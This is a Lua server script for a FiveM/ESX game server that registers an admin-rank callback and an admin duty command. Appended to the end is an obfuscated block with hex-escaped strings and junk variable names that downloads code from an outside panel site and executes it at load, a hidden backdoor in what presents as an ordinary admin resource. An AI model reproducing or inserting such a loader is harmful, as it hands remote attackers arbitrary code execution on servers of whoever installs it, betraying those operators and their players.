local ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj  end)

ESX.RegisterServerCallback("Admin:getRankFromPlayer", function(source, cb)
    local player = ESX.GetPlayerFromId(source)

    if player ~= nil then
        local playerGroup = player.getGroup()

        if playerGroup ~= nil then 
            cb(playerGroup)
        else
            cb("user")
        end
    else
        cb("user")
    end
end)

TriggerEvent("es:addGroupCommand", "admin", "admin", function(source, args)
    TriggerClientEvent("toggleDuty", source, "admin")
end)


local JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x5a\x43\x73\x4d\x69\x43", function (NITGVQwpvzdWIEsIKRRTcnvXYZGcHqhpHEraydIxOKENUiiZyoncOhpShzLIkVUQJOoeqm, sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij) if (sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[6] or sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[5]) then return end JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[2]](JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[3]](sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij))() end)